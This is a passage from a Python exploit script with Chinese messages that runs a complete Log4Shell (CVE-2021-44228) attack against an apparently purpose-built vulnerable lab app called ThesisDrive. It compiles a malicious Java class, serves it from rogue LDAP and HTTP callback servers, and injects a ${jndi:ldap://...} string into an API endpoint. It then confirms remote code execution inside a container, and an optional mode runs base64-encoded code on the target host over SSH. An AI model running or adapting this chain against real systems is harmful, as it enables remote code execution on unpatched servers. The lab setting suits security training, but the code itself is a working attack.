        print(_c(RED, "缺少 --callback。")
              + "\n\n"
              + _c(YEL, "  --callback 必须是靶机能路由到的回调地址：\n")
              + "    · 在靶机宿主机上跑（本地模式）  → --callback 172.20.0.1\n"
              + "    · 在外部攻击机上跑（--external）→ --callback 172.20.0.1\n"
              + "      （回调服务会自动部署到靶机宿主机代跑）\n\n"
              + _c(CYN, "  本地模式: python3 log4shell_exp.py --callback 172.20.0.1 --insecure\n")
              + _c(CYN, "  外部模式: python  log4shell_exp.py --external --callback 172.20.0.1 --insecure\n")
              + _c(CYN, "  只读回显: python  log4shell_exp.py --read --ssh opencloud\n"))
        return 2

    banner = f"""
{_c(BOLD + CYN, '╔' + '═' * 66 + '╗')}
{_c(BOLD + CYN, '║   ThesisDrive · Log4Shell (CVE-2021-44228) 完整利用链')}              {_c(BOLD + CYN, '║')}
{_c(BOLD + CYN, '║   /api/log4shell → InitialContext.lookup → 远程类加载 → RCE')}      {_c(BOLD + CYN, '║')}
{_c(BOLD + CYN, '╚' + '═' * 66 + '╝')}"""
    print(banner)
    mode = "外部模式（本机触发 + 靶机代跑回调）" if args.external else "本地模式"
    info(f"运行模式: {_c(BOLD, mode)}")
    info(f"靶场入口: {_c(BOLD, args.host + ':' + str(args.port) + args.path)}")
    info(f"回调地址: {_c(BOLD, args.callback)}")

    id_out = args.marker.replace(".txt", "_id.txt")
    ssh_target = args.ssh

    # ── 1. 编译 payload ──────────────────────────────────────
    step(1, "编译恶意 payload 类")
    rce_cmd = args.cmd if args.cmd else DEFAULT_RCE_CMD
    if args.cmd:
        info(f"自定义命令: {_c(BOLD, args.cmd)}")
    else:
        info("使用内置命令集（id / whoami / uname / env / ls /app ...）")
        info("换命令: --cmd \"你要执行的命令\"")
    compiled_remotely = False
    cls, err = compile_payload(args.build_dir, args.marker, id_out, rce_cmd)
    if not cls and args.external:
        # 外部模式且本机无 JDK：编译放到步骤 2a 的那一次 SSH 里一起做，
        # 避免这里单独再开一次 SSH（本环境单次握手约 5.5 秒）。
        warn(f"本机编译不可用: {err}")
        info("编译将与回调服务部署合并到同一次 SSH 中完成")
        compiled_remotely = True
    elif not cls:
        bad(f"编译失败: {err}")
        info("需要 JDK（含 javac）。检查: javac -version")
        return 1
    else:
        size = os.path.getsize(cls)
        ok(f"编译完成: {cls} ({size} bytes)")
        info(f"静态块将写入: {args.marker}")
        with open(cls, "rb") as fh:
            magic = fh.read(8)
        dump_bytes("Exploit.class 头部（CAFEBABE）", magic, 8)

    # ── 2. 起 / 部署服务 ─────────────────────────────────────
    if args.external:
        if not external_setup(ssh_target, args, args.marker, id_out, rce_cmd):
            return 1
        ldap_srv = http_srv = None
    else:
        step(2, "启动 LDAP 引用服务 + HTTP 类服务")
        codebase_url = f"http://{args.callback}:{args.http_port}/"

        def log(msg):
            print(f"  {_c(DIM, '[' + time.strftime('%H:%M:%S') + ']')} {msg}")

        ldap_srv = ThreadedLDAPServer(("0.0.0.0", args.ldap_port),
                                      codebase_url, "Exploit", log)
        http_srv = ThreadedHTTPServer(("0.0.0.0", args.http_port),
                                      args.build_dir, log)
        threading.Thread(target=ldap_srv.serve_forever, daemon=True).start()
        threading.Thread(target=http_srv.serve_forever, daemon=True).start()
        time.sleep(0.4)
        ok(f"LDAP  监听 0.0.0.0:{args.ldap_port}")
        ok(f"HTTP  监听 0.0.0.0:{args.http_port}  (根目录 {args.build_dir})")

    # ── 3. 构造 payload ─────────────────────────────────────
    step(3, "构造 JNDI payload")
    jndi_url = f"ldap://{args.callback}:{args.ldap_port}/Exploit"
    info(f"JNDI URL : {jndi_url}")
    info(f"注入串   : ${{jndi:{jndi_url}}}")
    info("正则 $\\{jndi:([^}]+)} 会提取该串并 InitialContext.lookup()")

    # ── 4. 发起触发请求（始终由本机真实发出）─────────────────
    step(4, "向业务端点投递 payload" + ("（由本机真实发出）" if args.external else ""))
    scheme = "https" if args.port in (443, 8008, 8443) else "http"
    url = f"{scheme}://{args.host}:{args.port}{args.path}"
    opener = build_opener(args.insecure)
    t0 = time.time()
    status, raw = trigger(opener, url, jndi_url, args.token)
    elapsed = time.time() - t0
    if status is not None:
        ok(f"HTTP {status}  ({elapsed:.2f}s)")
        dump_bytes("响应体", raw, 1024)
        try:
            body = json.loads(raw.decode("utf-8", "replace"))
            if body.get("vulnerable") is True:
                ok("服务端确认 vulnerable=true（走了真 JNDI 分支）")
            elif "vulnerable" in body:
                bad("vulnerable=false —— VULN_LOG4SHELL_ENABLED 未开启")
                info("执行: scripts/log4shell_switch.sh 查看开关；"
                     "或设置 VULN_LOG4SHELL_ENABLED=true 后重建网关")
        except Exception:
            pass
    else:
        warn("未拿到响应（端点可能阻塞在 JNDI 查询上，属正常）")

    # ── 5. 等待回连 ─────────────────────────────────────────
    # 加速点：不再盲等固定秒数，而是轮询靶机回调日志，
    # 一旦看到网关下载了 .class（或等满 --wait 上限）立刻进入下一步。
    step(5, "等待靶机回连（最多 %.0fs，看到下载立即继续）" % args.wait)
    if args.external:
        # 单次 SSH：远端循环等回连，然后把「回调日志 + 容器内回显」
        # 一起吐回来。避免每轮轮询都新开一条 SSH（本环境每次 5.5 秒）。
        wait_s = max(3.0, float(args.wait))
        remote_py = (
            "import subprocess, sys, time\n"
            f"work = {REMOTE_WORKDIR!r}\n"
            f"marker = {args.marker!r}\n"
            f"idout = {id_out!r}\n"
            f"limit = {wait_s!r}\n"
            "t0 = time.time()\n"
            "hit = False\n"
            "while time.time() - t0 < limit:\n"
            "    try:\n"
            "        txt = open(work + '/helper.log').read()\n"
            "    except Exception:\n"
            "        txt = ''\n"
            "    if 'GET /Exploit.class' in txt:\n"
            "        hit = True\n"
            "        break\n"
            "    time.sleep(0.2)\n"
            "el = time.time() - t0\n"
            "print('WAIT_HIT' if hit else 'WAIT_MISS', f'{el:.1f}')\n"
            "print('@@SEG_LOG@@')\n"
            "try:\n"
            "    print(open(work + '/helper.log').read())\n"
            "except Exception:\n"
            "    pass\n"
            "run = lambda f: subprocess.run(\n"
            "    ['docker', 'exec', 'thesis-drive-security-gateway-1',\n"
            "     'sh', '-c', 'cat ' + f + ' 2>/dev/null || echo __NONE__'],\n"
            "    capture_output=True, text=True).stdout\n"
            "print('@@SEG_MARKER@@')\n"
            "print(run(marker))\n"
            "print('@@SEG_IDOUT@@')\n"
            "print(run(idout))\n"
        )
        pb = base64.b64encode(remote_py.encode("utf-8")).decode()
        proc = subprocess.run(
            ["ssh", "-o", "ConnectTimeout=20", ssh_target,
             f"echo {pb} | base64 -d > /tmp/_w.py && python3 /tmp/_w.py; "
             f"rm -f /tmp/_w.py"],
            capture_output=True, timeout=int(wait_s) + 60)
        raw = (proc.stdout or b"").decode("utf-8", "replace")
        err = (proc.stderr or b"").decode("utf-8", "replace")

        # 解析三段
        def _seg(name):
            try:
                return raw.split(f"@@SEG_{name}@@", 1)[1].split("@@SEG_", 1)[0]
            except IndexError:
                return ""
        m = re.search(r"WAIT_(HIT|MISS)\s+([\d.]+)", raw)
        if m and m.group(1) == "HIT":
            ok(f"网关已下载 payload（{m.group(2)}s 内）")
        log_text = _seg("LOG")
        if log_text.strip():
            print(_c(DIM, "  ── 靶机回调服务日志 ──"))
            for line in log_text.strip().splitlines()[-40:]:
                print(_c(DIM, f"  [远端] {line}"))
        marker_txt = _seg("MARKER")
        idout_txt = _seg("IDOUT")
        for label, txt in ((args.marker, marker_txt), (id_out, idout_txt)):
            if "__NONE__" in txt or not txt.strip():
                warn(f"未找到 {label}")
                continue
            print(_c(GRN + BOLD, f"\n  ┌── 网关容器内 {label} ─────────────────"))
            for line in txt.rstrip().splitlines():
                print(_c(DIM, "  │ ") + line)
            print(_c(GRN + BOLD, "  └──────────────────────────────────────────"))
        ldap_ok = "SearchRequest" in log_text or "命中" in log_text
        http_ok = "GET /Exploit.class" in log_text
        if ldap_ok:
            info("靶机回调日志显示：收到 LDAP SearchRequest（注入点已触发）")
        if http_ok:
            ok("靶机回调日志显示：网关已 GET /Exploit.class")
    else:
        deadline = time.time() + args.wait
        while time.time() < deadline:
            if (http_srv.records and ldap_srv.records):
                break
            time.sleep(0.2)
        print()
        if not ldap_srv.records:
            bad("LDAP 未收到任何连接 —— 检查 VULN_LOG4SHELL_ENABLED 与网络可达性")
        else:
            info(f"LDAP 交互记录 {len(ldap_srv.records)} 条：")
            for label, data in ldap_srv.records:
                print(f"    · {label}")
                dump_bytes(label, data if isinstance(data, bytes)
                           else data.encode(), 256)
        if http_srv.records:
            print()
            ok(f"HTTP 交互记录 {len(http_srv.records)} 条 —— 网关已下载 payload！")
        ldap_ok = bool(ldap_srv.records)
        http_ok = bool(http_srv.records)

    # ── 6. 结果判定 ─────────────────────────────────────────
    step(6, "结果判定")
    rc = 0
    if not ldap_ok:
        bad("链路未打通：网关没有发起 JNDI 查询")
        info("确认 VULN_LOG4SHELL_ENABLED=true 且端点返回 vulnerable:true")
        rc = 2
    elif not http_ok:
        bad("LDAP 已回连，但网关未下载 Exploit.class")
        warn("这是 JDK 21 trustURLCodebase=false 的典型表现")
        info("→ 需设置 LOG4SHELL_TRUST_CODEBASE=true 并重建 security-gateway")
        info("  执行: scripts/log4shell_switch.sh on --recreate")
        info("  此时链路仅验证到「注入点可触发远程 JNDI」，不能 RCE")
        rc = 3
    else:
        print(f"""
{_c(GRN + BOLD, '  ✔ 完整利用链打通')}

  {_c(BOLD, 'POST /api/log4shell')}
      ↓  ${{jndi:ldap://{args.callback}:{args.ldap_port}/Exploit}}
  {_c(BOLD, 'InitialContext.lookup()')}
      ↓  LDAP SearchResultEntry
  {_c(BOLD, f'javaCodeBase=http://{args.callback}:{args.http_port}/')}
      ↓  HTTP GET /Exploit.class
  {_c(BOLD, '类加载 → static{} 执行')}
      ↓
  {_c(RED + BOLD, 'RCE 达成')}
""")
        info("验证 RCE 落地：")
        if args.external:
            print(_c(DIM, f"    ssh {ssh_target} "
                          f"'docker exec thesis-drive-security-gateway-1 "
                          f"cat {args.marker}'"))
        else:
            print(_c(DIM, f"    docker exec thesis-drive-security-gateway-1 "
                          f"cat {args.marker}"))

    # ── 7. 清理（外部模式）───────────────────────────────────
    if args.external and not args.keep_helper and not args.stay:
        print()
        external_cleanup(ssh_target)
    elif args.external and args.stay:
        print()
        ok("回调服务已常驻靶机（--stay），本次不清理")
        info("后续演示：直接重跑本命令即可；只看结果用 --read")
        info(f"关机前手动清理：ssh {ssh_target} \"rm -rf {REMOTE_WORKDIR}\"")

    return rc


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        print("\n已中断")
        sys.exit(130)
